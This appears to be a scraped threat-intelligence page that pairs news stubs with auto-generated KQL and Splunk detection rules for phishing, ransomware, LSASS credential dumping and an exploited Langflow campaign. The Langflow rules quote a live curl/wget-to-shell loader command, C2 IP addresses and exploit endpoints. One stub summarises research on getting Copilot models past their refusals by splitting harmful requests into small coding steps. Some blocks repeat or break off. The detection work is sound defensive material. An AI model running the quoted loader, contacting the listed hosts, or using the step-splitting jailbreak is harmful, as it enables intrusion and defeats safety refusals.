The Verification Step Is the New ATO Battleground in 2026

The Hacker News
2026-07-08 8 use cases 4 techniques 5 kill-chain phases detected

For years, account takeover (ATO) followed a predictable script. Attackers bought stolen credentials in bulk, ran them through automated tools, and waited for matches. Credential stuffing was cheap, scalable, and for defenders, relatively well understood. That era is ending. Not because attackers gave up, but because the front door finally got harder to kick in. Passkeys are now mainstream.

ATT&CKT1190 T1486 T1555.003 T1566

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

GitHub Copilot Refuses Harmful Requests in Chat, Then Writes Them in Code

The Hacker News
2026-07-08 5 use cases 3 techniques 5 kill-chain phases detected

An AI coding assistant that refuses to answer a dangerous request in its chat box can answer it anyway if the same request is broken into small, ordinary-looking steps inside a code editor. That is the finding of a&nbsp;new study of GitHub Copilot&nbsp;by researchers Abhishek Kumar and Carsten Maple. The models they tested through Copilot, Claude from Anthropic, and Gemini from Google, refused

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.

| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",

                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

description: |

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName

// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) · [LLM] Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) · [LLM] Langflow exploitation marker file /tmp/lang_pwn created
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) AIExploitation High
Hunts the CVE-2026-55255 cross-tenant IDOR chain where one client first pulls GET /api/v1/flows/ to harvest flow UUIDs, then replays those UUIDs as the model parameter on POST /api/v1/responses to execute another user's flow. Article-specific because it correlates the exact enumeration-then-abuse endpoint pair on the same source within a short window. Rationale: Uses the exact Sysdig-documented sequence (GET /api/v1/flows/ harvest -> POST /api/v1/responses replay) confirmed in the Sysdig TRT blog; correlating the two Langflow endpoints on one source is far higher fidelity than either path alone. Defender AH has no inbound reverse-proxy request-path table, so defender_kql is intentionally empty. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2
ATT&CKT1190 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Langflow power-user iterating flows via UI who hits /api/v1/flows/ then runs their OWN flow via /api/v1/responses
  • Automated CI/CD or synthetic-monitoring bot exercising the Langflow REST API
  • Internal load/perf test replaying enumerated flow IDs
  • Langflow admin auditing all flows across tenants for governance
Suppression filter
| where SrcIpAddr !in ("127.0.0.1") and DstIpAddr !in ("127.0.0.1")
Response runbook
1) TRIAGE: pull the app-layer Langflow logs for this SrcIpAddr and confirm the authenticated user's ID differs from the owner of the referenced flow_id UUID; check whether input body was 'leak api keys'. 2) CONTAIN: block the source IP at the WAF, force-rotate any LLM/cloud API keys stored in the affected flows, and pull the Langflow instance behind auth/VPN. 3) HUNT: pivot to the host for follow-on /api/v1/build_public_tmp RCE calls, curl/wget to 45.207.216.55, and the /tmp/lang_pwn marker.
let win = 30m;
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/flows" or Url has "/api/v1/responses" or Url has "/api/v1/build_public_tmp"
| summarize Urls = make_set(Url, 50), Methods = make_set(HttpMethod), Reqs = count(), FirstSeen = min(TimeGenerated) by SrcIpAddr, DstIpAddr, bin(TimeGenerated, win)
| extend U = tostring(Urls)
| where U has "/api/v1/flows" and (U has "/api/v1/responses" or U has "/api/v1/build_public_tmp")
| project FirstSeen, SrcIpAddr, DstIpAddr, Methods, Reqs, Urls
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017) AIExploitation High
Alerts on POST requests to the Langflow /api/v1/build_public_tmp/<uuid>/flow endpoint used to inject the malicious custom component that achieves code execution, plus the auto_login/api_key recon probes that precede it. This is inherently exploit traffic — legitimate clients do not build public temp flows against this API path. Rationale: The /api/v1/build_public_tmp/<uuid>/flow POST is the exact RCE payload-injection endpoint Sysdig captured for CVE-2026-33017, and /api/v1/auto_login is the documented no-auth recon probe; both are exploit-only paths. Defender AH lacks inbound web-request telemetry so defender_kql is empty by design. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Langflow security scanner / VA tool (Nessus, Nuclei) probing the same endpoints in an authorized scan
  • Internal red-team validation of the CVE-2026-33017 patch
  • Langflow health-check monitoring that hits /api/v1/auto_login on a no-auth default deployment
  • Developer testing a public temp flow build in a sandbox instance
Response runbook
1) TRIAGE: confirm Langflow version < 1.9.1 and whether the instance is internet-exposed; inspect the request body/response for injected component code and outbound-connection attempts. 2) CONTAIN: isolate the Langflow host, block the source IP, and snapshot for forensics before the loader executes. 3) HUNT: on the host look for child shells of the Langflow/uvicorn process, curl/wget to 45.207.216.55:8084/slt, and creation of /tmp/lang_pwn.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/build_public_tmp" or Url has "/api/v1/auto_login"
| project TimeGenerated, SrcIpAddr, DstIpAddr, HttpMethod, Url, HttpStatusCode, HttpUserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) AIInstallation High
Detects the second-stage loader command executed via the Langflow RCE: a curl/wget to http://45.207.216.55:8084/slt piped into sh. This is the execution pivot on the compromised Linux AI host, spawned by the Langflow/python/uvicorn service account. Rationale: Matches the exact Sysdig-captured loader string '(curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt) | sh' via the confirmed C2 IP plus the /slt path; the IP is corroborated by both the article and Sysdig TRT. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://hackread.com/sysdig-jadepuffer-first-agentic-ransomware-operation/
ATT&CKT1059.004 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Admin manually running curl/wget to that IP during IOC validation or threat-hunt reproduction
  • Security tool sandbox detonating the sample against the live C2
  • Legitimate internal artifact server that happens to share the /slt path (unlikely given the hard-coded attacker IP)
Suppression filter
| where InitiatingProcessAccountName !in~ ("root") or InitiatingProcessFileName has_any ("python","uvicorn","gunicorn","langflow","sh")
Response runbook
1) TRIAGE: confirm the parent is the Langflow/uvicorn/python service and pull the full process tree and download response. 2) CONTAIN: kill the process tree, network-isolate the host, and block 45.207.216.55 egress at the firewall. 3) HUNT: enumerate other hosts beaconing to 45.207.216.55:8084, look for the /tmp/lang_pwn marker, and check for harvested LLM/cloud API keys and pg_dump activity against the Langflow PostgreSQL DB.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has_any ("/slt", "curl", "wget")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has_any ("/slt", "curl", "wget")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName = TargetProcessName, ProcessCommandLine = TargetProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) AICommand & Control High
Detects outbound connections from a Langflow host to the campaign C2 infrastructure, primarily 45.207.216.55 on port 8084 (loader host), plus the additional campaign IPs. High-fidelity because the primary IP/port is confirmed by Sysdig as the /slt loader and beacon endpoint. Rationale: 45.207.216.55:8084 is the Sysdig-confirmed loader/C2 endpoint (both article and Sysdig TRT); 45.131.66.106 and 64.20.53.230 came from the article's IOC list and are shipped as lower-confidence secondary IOCs pending independent confirmation. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://www.securityweek.com/agentic-ai-used-to-conduct-ransomware-attack-via-langflow/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment/scanning platform (e.g. a TIP or Shodan-style scanner) connecting to the C2 for research
  • Analyst IOC-validation curl from a jump box
  • Sinkhole or takedown infrastructure now resolving the IP
  • Shared-hosting IP reuse if the VPS is later repurposed for benign services
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense","MonitoringHost") and not (DeviceName has_any ("scanner","ti-","honeypot"))
Response runbook
1) TRIAGE: identify the initiating process on the source host and confirm whether the connection targets port 8084 / the /slt URI. 2) CONTAIN: block all three IPs at the perimeter, isolate any beaconing host, and rotate LLM/cloud API keys reachable from that host. 3) HUNT: sweep for regular-interval callbacks (beacon cadence) to these IPs, the curl|sh loader process, /tmp/lang_pwn, and JadePuffer ransomware/pg_dump activity against Langflow's PostgreSQL DB.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(RemotePort), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by LastSeen desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(DstPortNumber), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, DstIpAddr, DvcHostname
| order by LastSeen desc

Langflow exploitation marker file /tmp/lang_pwn created AIInstallation High
Detects creation of the /tmp/lang_pwn marker file that the CVE-2026-55255/CVE-2026-33017 loader writes after successful exploitation on a Langflow host. A single, hard-coded artifact path unique to this campaign, making it a near-zero-FP confirmation of compromise. Rationale: /tmp/lang_pwn is the exact post-exploitation marker file Sysdig documented the loader writing on success; it is a unique, hard-coded artifact with essentially no benign collision. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1105 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst recreating the marker during IOC validation on a test host
  • Detection-engineering unit test seeding the file to validate this rule
  • Backup/restore of a previously compromised host image that still contains the artifact
Response runbook
1) TRIAGE: treat any real hit as confirmed compromise; identify the writing process and its Langflow-service parentage. 2) CONTAIN: isolate the host, preserve /tmp for forensics, block 45.207.216.55, and begin credential rotation (LLM/cloud keys, PostgreSQL). 3) HUNT: correlate with the curl|sh loader process, C2 beacons to 45.207.216.55:8084, inbound /api/v1/responses and /api/v1/build_public_tmp requests, and JadePuffer ransomware/pg_dump activity.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated", "FileModified")
| where FolderPath =~ "/tmp/lang_pwn" or FileName =~ "lang_pwn"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath =~ "/tmp/lang_pwn" or TargetFileName =~ "lang_pwn"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities

| where CveId in~ ("CVE-2026-55255", "CVE-2026-33017", "CVE-2025-3248", "CVE-2026-5027", "CVE-2021-29441")

DeviceTvmSoftwareVulnerabilities

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

| `drop_dm_object_name(Filesystem)`

| tstats summariesonly=false count, dc(Filesystem.file_name) AS files

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

China-Linked UAT-7810 Expands ORB Network With New LONGLEASH Malware

The Hacker News
2026-07-08 10 use cases 3 techniques 6 kill-chain phases detected

